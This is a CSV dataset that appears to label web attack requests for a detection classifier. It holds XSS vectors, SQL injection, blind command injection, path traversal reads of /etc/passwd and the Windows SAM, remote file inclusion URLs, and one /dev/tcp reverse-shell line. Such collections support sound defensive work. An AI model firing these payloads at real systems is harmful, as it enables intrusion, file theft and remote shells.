code,status
%22& sleep 0 && str=$(echo YTDCVX) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %22,1
"/odzk29aa.kspx?<meta http-equiv=set-cookie content=""testtfvh=2141"">",1
${system(print(`echo CTDUTJ\necho $((30+48))\necho CTDUTJ\necho CTDUTJ`);CTDUTJ,1
/examples/jsp/cal/includes/converter.inc.php?include_path=/etc/passwd\x00,1
<script,1
/top.php?stuff=&ping;-w;11000;-n;1;4.3.2.1&rem;,1
| [ 3 -ne $(echo JJZSID | tr -d '\n' | wc -c) ] || sleep 1 \\,1
 then sleep 0,1
"/top.php?stuff=""&rm\x0bq72181135&rem\x0b",1
| [ 1 -ne $(echo PFDJXJ | tr -d '\n' | wc -c) ] || sleep 1 &,1
/phpmyadmin/documentation.html?phpmyadmin=<!--,1
/scripts/../../winnt/system32/cmd.exe?/x+/c+copy \winnt\system32\cmd.exe 8obtsg.exe,1
| [ 8 -ne $(echo HDECHS | tr -d '\n' | wc -c) ] || sleep 1 %27,1
/error/\..\..\..\..\boot.ini,1
/scripts/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331923195')</script>,1
FALSE,1
"/<script>document.cookie=""testfuqi=4189;""</script>",1
&#x003C;,1
 str1=${#str},1
/examples/jsp/num/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=;,1
 echo YPQTYX$((9+27))$(echo YPQTYX)YPQTYX&,1
"/top.php?stuff=""ping\x09-w\x098000\x09-n\x091\x094.3.2.1|rem\x09",1
/examples/jsp/num/detail.asp?nchannel='1,1
"/1qwv2p5p.php?<script>document.cookie=""testvqcy=252;""</script>",1
"&lt;SCRIPT/SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
"<meta http-equiv=set-cookie content=""testpwew=1315"">",1
/examples/jsp/sessions/netauth.cgi?cmd=show&page=../../../../../../../../../etc/passwd,1
/search.php?q=<script>alert('wvs-xss-magic-string-414206083542')</script>&mode=apparel,1
/en-us/accountfaq.php?skin=../../admin/manager&tplpath=admin,1
/index.php?ads_file=XXpathXX,1
/javascript/ear.exe,1
/web/BetaBlockModules/ProfileFeedModule/ProfileFeedModule.php?path_prefix=XXpathXX,1
/javascript/encyption.exe,1
"/m5103snj.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/en-us/esmozg5d.php3?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/checkbox/sawmill6cl.exe?ho+{complete_version},1
"/<meta http-equiv=set-cookie content=""testpwew=1315"">",1
"/bxnyrhmh.kspx?<script>document.cookie=""testmjct=1867;""</script>",1
/examples/jsp/colors/data/fetch.php?page=',1
/examples/jsp/jsp2/jspx/config.php?path[docroot]=/etc/passwd\x00,1
/scripts/qop0sa1auif9.cgi,1
/b1q8bywu.kspx?<script>cross_site_scripting.nasl</script>,1
/%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},1
/cgibin/pfdisplay.cgi?'\x0a/bin/cat /etc/passwd|',1
/main.php?stuff=&uname\x09>q45915679\x09#,1
 then sleep 0,1
/.../.../.../.../.../,1
data:text/html;alert(1)/*,1
 str=$(echo KQSZPY),1
/examples/jsp/jsp2/el/index.cfm?fuseaction=category.display&category_id=',1
UNION#IEVjNIbBGg,1
"; str=$(echo GRQQCI); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27
; str=$(echo GRQQCI); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27",1
/examples/jsp/error/faq.php?action=&type=view&s=&id=-1' union select 0,1
/javascript/spool.exe,1
%22& sleep 0 && str=$(echo JWEAWE) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 &,1
/index.php?module=<script>foo</script>,1
/examples/jsp/sessions/loudblog/inc/parse_old.php?template=@system(id);@&php_use=1&phpseparator=@,1
/javascript/.passwd.cfg,1
"; str=$(echo VPBZFR); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26
; str=$(echo VPBZFR); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26",1
"<meta http-equiv=set-cookie content=""testkgqo=204"">",1
/javascript/htpasswd.java,1
"\""><script>alert(0x000123)</script>",1
/help.php?q='\x0ddel q75815481 #,1
"/main.php?stuff="";sleep\x097\x09#",1
"&echo WQLTXV$((0+25))$(echo WQLTXV)WQLTXV""",1
/cgi/c32web.exe/changeadminpassword,1
/admin/file_manager.php?action=read&filename=../../../../../../../../etc/passwd,1
"/g3w7y7u5.jspa?<script>document.cookie=""testbfpq=3326;""</script>",1
/scripts/b0j2ijssh6cu.sh,1
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
`'><script>\xE2\x80\x81javascript:alert(1)</script>",1
"/help.php?q=""|ping\xa0-w\xa08000\xa0-n\xa01\xa01.2.3.4|rem\xa0",1
"<script src=1 href=1 onerror=""javascript:alert(1)""></script>",1
/streamline-1.0-beta4/src/core/theme/includes/account_footer.php?sl_theme_unix_path=XXpathXX?,1
"<IMG SRC=""jav   ascript:alert('XSS');"">",1
"/cactisearch_results.dot?search_query=nessus""><script>alert('dotcms_search_query_xss.nasl')</script>/",1
/scripts/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331919142&lang_crm=../../vtigerservice.php\x00,1
Content-Transfer-Encoding: quoted-printable,1
${passthru(print(`echo PYELUB;echo $((29+64));echo PYELUB;echo PYELUB`);%23PYELUB,1
/examples/jsp/error/index.php?x=browse&category='union select '1',1
%22| [ 7 -ne $(echo BILMTI | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,1
echo$IFSSROBII$((44+41))$(echo$IFSSROBII)SROBII,1
"<a href=[0x0b]"" onclick=confirm(1)//"">click</a>",1
 then sleep 0,1
/classes/file_o.php?absolutepath=XXpathXX,1
"|echo LKRAYZ$((79+32))$(echo LKRAYZ)LKRAYZ'
||echo LPSQRE$((76+2))$(echo LPSQRE)LPSQRE'",1
/javascript/agenda.exe,1
| [ 3 -ne $(echo SKWMFK | tr -d '\n' | wc -c) ] || sleep 1 %26,1
/6qbynt4f.aspx?<script>cross_site_scripting.nasl</script>,1
 str=$(echo FXCZOR),1
/subscriptions.jsf,1
"/uvazfs7p.php3?<meta http-equiv=set-cookie content=""testwtbo=4831"">",1
'|echo CNIXGW$((42+54))$(echo CNIXGW)CNIXGW',1
/cgi-bin/cmd.exe?/c+dir,1
/examples/jsp/sessions/whois.cgi?action=load&whois=;id,1
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
&prompt(9)&,1
"/edzaia0i.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
 str1=${#str},1
1'&&1='1,1
/javascript/zip.exe,1
/scripts/editor/filemanager/connectors/php/upload.php?command=fileupload&type=file&currentfolder=/fckeditor_currentfolder_file_upload-1331905254.php.,1
"/qczkquis.jspa?<script>document.cookie=""testkwlg=5591;""</script>",1
/javascript/document.ora,1
"/dda2qr7j.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/admin/exec.php3?cmd=cat /etc/passwd,1
/auction/includes/messages.inc.php?include_path=XXpathXX?,1
 if [ 1 -ne ${str1} ],1
"/ny1b3qq4.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
& sleep 0 && str=$(echo GZNGDE) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &,1
"/bxnyrhmh.kspx?<meta http-equiv=set-cookie content=""testmjct=1867"">",1
/homeowner's-insurance/,1
/examples/jsp/error/cgiip.exe/wservice=wsbroker1/webtools/oscommand.w,1
"'&echo$IFSQYHHIE$((90+44))$(echo$IFSQYHHIE)QYHHIE""",1
<a href=``mspaint.exe``>,1
 if [ 2 -ne ${str1} ],1
%27,1
/scripts/ui/login?user=nessus-1331904327,1
/javascript/roaming.exe,1
"/en-us/oie504mr.dll?<meta http-equiv=set-cookie content=""testtpby=7052"">",1
"/<script>document.cookie=""testlihk=7070;""</script>",1
"<!--#echo var=""content_type"" -->",1
/examples/jsp/sessions/login.php?lang=/../../../../../../../../../../../../etc/passwd\x00,1
/examples/servlets/servlet/whois.cgi?action=load&whois=;id,1
/help.php?q=&del;q15387485&rem;,1
"<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=""click"";getElementById(""safe123"").click=function()+{confirm(Safe.get());};getElementById(""safe123"").click(test);</SCRIPT>#",1
/main.php?logout=';uname\x09>q16263765\x09#,1
"/bn857frh.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
 else sleep 1,1
/test.php?evalme=eval($_server[http_x_ipalsmokchfsaohgqgx]);,1
"/top.php?stuff=""&ping\x09-w\x097000\x09-n\x091\x094.3.2.1&rem\x09",1
';echo EDEYQK$((45+89))$(echo EDEYQK)EDEYQK&,1
+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-,1
/examples/jsp/error/includes/third_party/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/main.php?stuff=uname >q62419285 #,1
"/top.php?stuff=""&sleep\x0911\x09#",1
 str1=${#str},1
& sleep 0 && str=$(echo LVMWXB) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %5C%5C,1
"/main.php?stuff=""\x0drm\x09q27469451\x09#",1
"/addvip.php?msetstr[\""progsdir\""]=@rfiurl",1
&&echo$IFSYSBJXS$((33+16))$(echo$IFSYSBJXS)YSBJXS//,1
"/vmi8bb12.php3?<script>document.cookie=""testlerc=2575;""</script>",1
"/b4vng02k.jsp?<meta http-equiv=set-cookie content=""testtrlh=3672"">",1
/phplib/version/1.3.3/module/surfer_anmeldung_NWL.php?tt_docroot=XXpathXX,1
/examples/jsp/jsp2/jspx/protection.php?action=logout&siteurl=/etc/passwd,1
"<xml id=""xss"" src=""test.htc""></xml><label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>",1
 str=$(echo FWGGRQ),1
/gepi/gestion/savebackup.php?filename=http://192.168.202.96:8080/4dckqcc0acprbz?&cmd=cat/etc/passwd,1
"<iframe src="""" onmouseover=""confirm(document.cookie)"">",1
"/aj3pf49c.do?<meta http-equiv=set-cookie content=""testnofv=4170"">",1
"/9ko6m4c8.php3?<script>document.cookie=""testylik=3403;""</script>",1
"/d765w06j.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/jsp2/el/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd\x00&bn=fm_d1,1
/d7ktpmcq.nsf?<script>cross_site_scripting.nasl</script>,1
/scripts/openview5.exe?target=main&action=../../../../../../../../../..//winnt/win.ini,1
 if [ 9 -ne ${str1} ],1
',1
%22| [ 2 -ne $(echo BWWRBC | tr -d '\n' | wc -c) ] || sleep 1 \\,1
 else sleep 1,1
"/qhvu0pdg.php?<script>document.cookie=""testchuc=2100;""</script>",1
/javascript/blogs.exe,1
/getpage.php?page=online&doc_path=XXpathXX,1
/awstats/awstats.pl?migrate=|echo;/./tmp/oyiiraofvl.sh;echo|awstats651715.txt,1
/examples/jsp/checkbox/index.php?post=../config/password,1
/cacti/common/visiteurs/include/menus.inc.php?lvc_include_dir=/etc/passwd\x00,1
/scriptinga/,1
& sleep 0 && str=$(echo WVUPXI) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 %22,1
/main.php?frm_daynight=day&frm_passwd=&frm_referer=http://192.168.23.202/main.php&frm_user=q44275597&scr_height=&scr_width=,1
 fi #,1
/subscriptionhomepage/,1
/examples/jsp/jsp2/el/simple/view_page?mv_arg=|cat /etc/passwd|,1
"/bl8sefdm.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/main.php?stuff=';uname\x09>q19963916\x09#,1
/scripts/biztalkhttpreceive.dll,1
/index.php?app=core&module=global&section=register/register/page__section__../../../../../cache/installer_lock__,1
| [ 6 -ne $(echo MMQKSR | tr -d '\n' | wc -c) ] || sleep 1 &,1
'| [ 1 -ne $(echo RLZFDE | tr -d '\n' | wc -c) ] || sleep 1 #,1
/javascript/access-log.1.exe,1
/examples/jsp/jsp2/jspx/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor,1
"<!-- IE 5-8 standards mode --><a href=http://foo.bar/#x=`y></a><img alt=""`><img src=xx:x onerror=alert(1)></a>""><!-- IE 5-9 standards mode --><!a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(2)//""><?a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(3)//"">",1
/viagra-prescription/,1
'&echo$IFSANEBTG$((60+67))$(echo$IFSANEBTG)ANEBTG\,1
/javascript/upload.exe,1
/scripts/plugins/safehtml/htmlsax3.php?dir[plugins]=/etc/passwd\x00,1
 else sleep 1,1
/help.php?q=';rm\x09q85144243\x09#,1
"/bl8sefdm.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
 then sleep 0,1
"<a href=""\x1Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
/pxagj7n7.aspx?<script>cross_site_scripting.nasl</script>,1
/javascript/s.exe,1
"/ghswfouu.jsp?<meta http-equiv=set-cookie content=""testsqmm=5713"">",1
/phpmyadmin/smpwservicescgi.exe,1
<script>crypto.generateCRMFRequest('CN=0',1
<%/%=%&#62<&#112/&#111&#110&#114&#101&#115&#105&#122&#101=&#97&#108&#101&#114&#116(1)//>,1
/examples/jsp/jsp2/el/zml.cgi?file=../../../../../../../../../../../../etc/passwd\x00,1
/6n7aacgg.nsf?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/checkbox/cal_week.php?op=week&catview=999',1
| [ 9 -ne $(echo VAZLJC | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,1
& sleep 0 && str=$(echo XDTLTK) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 \\,1
/scripts/index.php?option=frontpage&itemid=2|system(id)|1332008331,1
'; EXEC ('SEL' + 'ECT US' + 'ER'),1
& sleep 0 && str=$(echo TPCDNB) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %5C%5C,1
/javascript/scan.exe,1
/htbin/vssetcookie.exe,1
'print(`echo UDOCFL\necho $((86+7))\necho UDOCFL\necho UDOCFL`);.%252522UDOCFL,1
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) #
,(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
,(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
,(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
',(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
',(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
',(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))#
",1
||echo$IFSJNIADE$((97+6))$(echo$IFSJNIADE)JNIADE\,1
"onload=""eval(name)"";>",1
 else sleep 1,1
/examples/servlets/servlet/error.php?selected_theme=<script>alert(uebimiau_selected_theme_xss.nasl)</script>,1
/calendar_admin.pl?config=|cat /etc/passwd|,1
 if [ 3 -ne ${str1} ],1
 if [ 2 -ne ${str1} ],1
//q47417758&#x26;q6971&#x22;q6971&#x3c;q6971&#x3e;q47417758,1
as,1
/scripts/c/portal/login,1
<img src=x onerror=URL='javascript:confirm(1)'>,1
 str1=${#str},1
 fi #,1
/..\..\..\..\..\../windows/repair/sam,1
/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd\x00,1
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,1
/_vti_bin/..\xc1\x9c..\xc1\x9c..\xc1\x9c..\xc1\x9c..\xc1\x9c../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
"/help.php?q=""\x0ddel q43695626 #",1
"/vhzmaia2.idc?<meta http-equiv=set-cookie content=""testkogj=3979"">",1
/rss2.php?page[path]=XXpathXX?&cmd=ls,1
/examples/jsp/cal/mylog.html?screen=/etc/passwd,1
/script_viruses/,1
/scripts/polls.scr.php?globals[pth][classes]=http://192.168.202.118:8080/ghl9il??,1
 else sleep 1,1
<img src=javascript:alert(&quot;XSS&quot;)>,1
"/help.php?q=""&ping -w 8000 -n 1 4.3.2.1&rem ",1
/modules/snf/index.php?full_path=XXpathXX,1
"/awstatstotals.php?sort=""].passthru('id').exit().$a[""",1
/examples/jsp/colors/themes/program/themesettings.inc.php?themesdir=/etc/passwd\x00,1
 echo HLPASS$((48+61))$(echo HLPASS)HLPASS,1
"/b4vng02k.mscgi?<script>document.cookie=""testtrlh=3672;""</script>",1
![a](javascript:prompt(document.cookie))\,1
/examples/jsp/cal/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; ,1
"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(1)"">DEF",1
/projects/1/repository/annotate?rev=`0<&200-;exec 200<>/dev/tcp/192.168.202.96/16919;sh <&200 >&200 2>&200`,1
<script> logChr0x09(1); </script>,1
/bl8sefdm.fts?<script>cross_site_scripting.nasl</script>,1
/manager/crystalimagehandler.aspx?dynamicimage=../../../../../../../../winnt/system.ini,1
/scripts/index.php?selskin=../inc/boxleft.inc\x00&xposbox[l][]=/etc/passwd\x00,1
/examples/jsp/checkbox/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor,1
"/main.php?logout=""ping\x0c-w\x0c8000\x0c-n\x0c1\x0c4.3.2.1|rem\x0c",1
/javascript/baz.exe,1
/../../../../../../../../../../../boot.ini,1
"/uvazfs7p.x?<script>document.cookie=""testwtbo=4831;""</script>",1
<object data=javascript:alert(1)> ,1
 fi %27,1
"/help.php?q=""\x0arm\x09q45619595\x09#",1
/en-us/n9xlumt5.html?<script>cross_site_scripting.nasl</script>,1
"/comersus_searchitem.asp""><script>alert('nessus was here');</script>",1
/cgi-exe/r.cgi?file=../../../../../../../../../../etc/passwd,1
/scripts/apexec.pl?etype=odp&passurl=/category/&template=../../../../../../../../../../etc/passwd\x00.html,1
/supasite/admin_auth_cookies.php?supa[db_path]=XXpathXX,1
 if [ 1 -ne ${str1} ],1
#xD#xA,1
/starnet/addons/slideshow_full.php?album_name='936668697,1
/javascript/reverse.exe,1
123/*!or*/1=1;,1
/calendar.php?vwar_root=XXpathXX?,1
"<? foo=""><x foo='?><script>alert(91)</script>'>"">",1
| [ 4 -ne $(echo PFDJXJ | tr -d '\n' | wc -c) ] || sleep 1 &,1
 str=$(echo JTZCSG),1
& sleep 0 && str=$(echo QHSDUY) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 %22,1
"<style onload='execScript(""InputBox+1""",1
 fi %22,1
"/main.php?logout=""\x0duname >q69325217 #",1
 str1=${#str},1
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",1
/examples/jsp/error/faxsurvey?cat /etc/passwd,1
; str=$(echo EWCHCT); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,1
/en-us/account/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331905098')</script>,1
/scgi-bin/query?mss=../config,1
| [ 3 -ne $(echo CDUKUS | tr -d '\n' | wc -c) ] || sleep 1 //,1
/javascript/forums.exe,1
"/scs86g1p.pl?<script>document.cookie=""testquyx=2820;""</script>",1
'& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #,1
 else sleep 1,1
/javascript/maven.exe,1
 else sleep 1,1
/javascript/dclk.exe,1
/cgi-exe/fileseek2.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=,1
; str=$(echo VGHMVB); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,1
"/main.php?logout=""ping\x0c-w\x0c8000\x0c-n\x0c1\x0c1.2.3.4|rem\x0c",1
/scripts/pssdseehtgdp.inc,1
<IMG SRC=JaVaScRiPt:confirm(document.location)>,1
 fi %22,1
/cgi-win/fileseek.cgi?foot=;cat /etc/passwd&head=,1
/zuihld5m.php?<script>cross_site_scripting.nasl</script>,1
/top.php?stuff=&ver\xa0>q89228348&rem\xa0,1
/careerdescription/,1
"%27| [ 5 -ne $(echo LDSBTA | tr -d '\n' | wc -c) ] || sleep 1 """,1
/javascript/subscribe.exe,1
& sleep 0 && str=$(echo ERXFFG) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 ,1
/cgibin/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|,1
"<IMG SRC=""livescript:[code]"">",1
 str1=${#str},1
/scripts/admin/login/index.php,1
/opensiteadmin/scripts/classes/loginmanager.php?path=http://192.168.202.118:8080/ghl9il?\x00,1
/d5a5renl.asp?<script>cross_site_scripting.nasl</script>,1
echo SCGPHN`);%2529%257DSCGPHN,1
| [ 7 -ne $(echo HZZOKR | tr -d '\n' | wc -c) ] || sleep 1 &,1
/examples/jsp/checkbox/print.php?what=article&id=',1
/classes/Auth/OpenID/Extension.php?_ENV[asicms][path]=XXpathXX,1
 if [ 3 -ne ${str1} ],1
/scripts/piywzua5hwer.php,1
"<IMG LOWSRC=""javascript:confirm(document.location)"">",1
'print(`echo MURMGO,1
/en-us/account/welcome.php?custom_welcome_page=/etc/passwd\x00,1
"<BASE HREF=""javascript:confirm('XSS');//"">",1
 else sleep 1,1
'; str=$(echo QZBRFT); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,1
"/ht8pn8uq.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
 if [ 7 -ne ${str1} ],1
/scripts/eezuu7xc7ge3.cfm,1
'||echo$IFSVCFZJU$((65+17))$(echo$IFSVCFZJU)VCFZJU&,1
'print(`echo DQLEND`.`echo $((63+84))`.`echo DQLEND`.`echo DQLEND`);\\DQLEND,1
"/top.php?stuff=""rm",1
; str=$(echo NMEESI); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,1
/quagynka.mscgi?<script>cross_site_scripting.nasl</script>,1
/javascript/emu.exe,1
"/gvx7m5ti.do?<script>document.cookie=""testwldz=3506;""</script>",1
/top.php?stuff=;rm q28242581 #,1
<script>eval.call`${'prompt\x281)'}`</script>,1
"'&echo$IFSHNQWXR$((73+6))$(echo$IFSHNQWXR)HNQWXR""",1
 fi %2F%2F,1
/main.php?logout=&del;q28829334&rem;,1
/cgi-bin/index.php?page=/etc/passwd\x00,1
/yver8r9o.aspx?<script>cross_site_scripting.nasl</script>,1
%22& sleep 0 && str=$(echo ZTQVNM) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 ',1
/examples/jsp/checkbox/sendtemp.pl?templ=../../../../../etc/passwd,1
/javascript/prop-base.exe,1
"/help.php?q=""\x0duname\x09>q76412123\x09#",1
<!,1
"/login/sm_login_screen.php?error=\""><script>alert('vulnerable')</script>",1
<img onerror=eval('al&#x5c;u0065rt(1)') src=a>,1
/scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331919205,1
"| [ 8 -ne $(echo TIQLNL | tr -d '\n' | wc -c) ] || sleep 1 %27
| [ 9 -ne $(echo TIQLNL | tr -d '\n' | wc -c) ] || sleep 1 %27",1
/scripts/index.php?id='union/**/select/**/0,1
 then sleep 0,1
 str=$(echo WAJEOU),1
/examples/jsp/error/index.php?gadget=../../../../../../etc/passwd\x00&path=/etc,1
"<body onload=""'use strict';throw new class extends Function{}('alert(1)')``"">",1
/manager/squirrelcart/cart_content.php?cart_isp_root=/etc/passwd\x00,1
/forum-ra_professionnel.asp?n=/../../../etc/passwd,1
&#x3E;,1
%27| [ 1 -ne $(echo RDJFGW | tr -d '\n' | wc -c) ] || sleep 1 %26,1
"'""--></style></script><script>RWAR(0x00010E)</script>",1
 str1=${#str},1
"&&echo$IFSWMOQUS$((33+35))$(echo$IFSWMOQUS)WMOQUS""",1
&echo GICKYF$((34+87))$(echo GICKYF)GICKYF&,1
 if [ 3 -ne ${str1} ],1
"/ghswfouu.dll?<meta http-equiv=set-cookie content=""testsqmm=5713"">",1
 else sleep 1,1
 if [ 3 -ne ${str1} ],1
 if [ 7 -ne ${str1} ],1
 if [ 4 -ne ${str1} ],1
'&echo$IFSDVJEEK$((20+0))$(echo$IFSDVJEEK)DVJEEK,1
/index.php?id='union/**/select/**/0,1
/scripts/app_and_readme/navigator/index.php?page=http://192.168.202.118:8080/moclyxlwqyfjnp?,1
 str1=${#str},1
/examples/jsp/num/misc/audio.php?recording=../version.inc,1
"/n1afe1y6.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
//|\\ <script //|\\ src='http://xss.cx/xss.js'> //|\\ </script //|\\,1
/examples/jsp/colors/bb-hostsvc.sh?hostsvc=../../../../../etc/passwd,1
/top.php?stuff='|sleep 10 #,1
 then sleep 0,1
' or 1=1,1
"'"">><marquee><h1>1</h1></marquee>",1
"/examples/jsp/colors/activatemember?activatecode=&member=""><script>alert('mvnforum_activatemember_xss.nasl')</script>",1
"/top.php?stuff=""rm;q48162266&rem;",1
/scripts/index.php?option=frontpage&itemid=2|system(id)|1331908729,1
" fi """,1
"/main.php?stuff=""ver&rem\x09",1
',1
/subscriptions.dll,1
/scripts/viewcvs.cgi/,1
< / script >< script >alert(123)< / script >,1
/class-pangofontdescription/,1
/javascript/setup.exe,1
/recordings/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/install/di.php?pathtoserverdata=XXpathXX,1
